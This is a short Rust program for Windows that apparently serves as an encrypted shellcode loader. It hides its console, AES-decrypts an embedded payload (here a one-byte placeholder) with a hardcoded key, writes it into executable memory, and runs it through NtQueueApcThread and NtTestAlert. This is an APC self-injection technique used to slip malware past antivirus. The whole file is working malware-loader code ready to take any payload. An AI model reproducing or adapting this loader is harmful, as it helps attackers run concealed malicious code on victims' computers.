#![cfg(windows)]
use ntapi::ntmmapi::{NtAllocateVirtualMemory,NtWriteVirtualMemory};
use ntapi::ntpsapi::{NtCurrentProcess,NtCurrentThread,NtQueueApcThread,NtTestAlert,PPS_APC_ROUTINE};
use std::ptr::null_mut;
use ntapi::winapi::ctypes::c_void;
use libaes::Cipher;

fn main(){
    unsafe {winapi::um::wincon::FreeConsole();};
    let key : [u8;16] = [0x81, 0x5, 0x8b, 0x53, 0xfc, 0xd4, 0x5d, 0xc8, 0x55, 0xf7, 0xf0, 0xf7, 0x44, 0x4d, 0x88, 0xdb];
    let shellcode : [u8;1] = [0x70];
    let iv = b"This is 16 bytes";
    let cipher = Cipher::new_128(&key);
    let decrypted = cipher.cbc_decrypt(iv, &shellcode[..]);
        unsafe {
            let mut allocstart : *mut c_void = null_mut();
            let mut seize : usize = decrypted.len();
            NtAllocateVirtualMemory(NtCurrentProcess,&mut allocstart,0,&mut seize, 0x00003000, 0x40);
            NtWriteVirtualMemory(NtCurrentProcess,allocstart,decrypted.as_ptr() as _,decrypted.len() as usize,null_mut());
            NtQueueApcThread(NtCurrentThread,Some(std::mem::transmute(allocstart)) as PPS_APC_ROUTINE,allocstart,null_mut(),null_mut());
            NtTestAlert();
        }
}

